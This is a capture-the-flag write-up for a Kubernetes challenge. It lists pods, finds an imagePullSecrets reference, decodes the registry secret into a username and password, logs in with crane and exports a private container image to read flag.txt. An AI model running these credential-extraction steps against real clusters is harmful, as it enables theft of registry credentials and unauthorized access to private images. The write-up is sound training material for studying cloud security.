## Registry Hunt
Goal: Retrieve content of a file called "flag.txt" by leveraging a registry secret. 

Permissions: 

{
    "secrets": [
        "get"
    ],
    "pods": [
        "list",
        "get"
    ]
}

Service account: service-account-challenge2
Namespace: challenge2

If we get the secrets within the challenge2, we can see that we don't have access to list secrets. Since we have access to get pods, we can inspect the pods yaml for clues. 

```bash
kubectl get pods
```
```bash
Output
NAME                    READY   STATUS    RESTARTS   AGE
database-pod-2c9b3a4e   1/1     Running   0          8d
```
Let's inspect the pod's yaml
```bash
kubectl get pod database-pod-2c9b3a4e -o yaml
```
From the pod's yaml, we can get the containers image and imagePullSecrets.

```bash
Output

spec:
  containers:
    - image: eksclustergames/base_ext_image

imagePullSecrets:
  - name: registry-pull-secrets-780bab1d
```
Read more on imagePullSecrets - [Pull an Image from a Private Registry](https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/)

In this case, the secret __registry-pull-secrets-780bab1d__ is used to pull the image from the private container image registry.

A Kubernetes cluster uses the Secret of kubernetes.io/dockerconfigjson type to authenticate with a container registry to pull a private image. Since we do have permission to "get" secrets in the namespace, we can view the secrets yaml and. 

```bash
kubectl get secrets registry-pull-secrets-780bab1d --output="jsonpath={.data.\.dockerconfigjson}" | base64 -d
```

```bash
Output

{"auths": {"index.docker.io/v1/": {"auth": "..."}}}
```

Grab the token inside __auth__ and decode it one more time to retrieve the user and password. 

```bash
echo "..." | base64 -d
```
```bash
Output

username:password
```
Now that we have the username and password, its time to authenticate against the registry using the tool provided [Crane](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md). 


```bash
crane auth login index.docker.io -u ... -p ...
```
```bash
Output

2023/11/09 15:01:52 logged in via /home/user/.docker/config.json
```
Now that we are authenticated, we can export filesystem of the container image as a tarball.

```bash
crane export docker.io/eksclustergames/base_ext_image - | tar -xvf -
```
```bash
ls -l
```
```bash
Output

total 20
drwxr-xr-x 2 root root 12288 Jul 17 18:30 bin
drwxr-xr-x 2 root root     6 Jul 17 18:30 dev
drwxr-xr-x 3 root root   100 Nov  9 15:09 etc
-rw-r--r-- 1 root root   124 Nov  1 13:32 flag.txt
drwxr-xr-x 2 root root     6 Jul 17 18:30 home
drwxr-xr-x 2 root root   213 Jul 17 18:30 lib
lrwxrwxrwx 1 root root     3 Jul 17 18:30 lib64 -> lib
drwxr-xr-x 2 root root     6 Nov  1 13:32 proc
drwx------ 2 root root     6 Jul 17 18:30 root
drwxr-xr-x 2 root root     6 Nov  1 13:32 sys
drwxrwxrwt 2 root root     6 Jul 17 18:30 tmp
drwxr-xr-x 4 root root    29 Jul 17 18:30 usr
drwxr-xr-x 4 root root    30 Jul 17 18:30 var
```
```bash
cat flag.txt
```

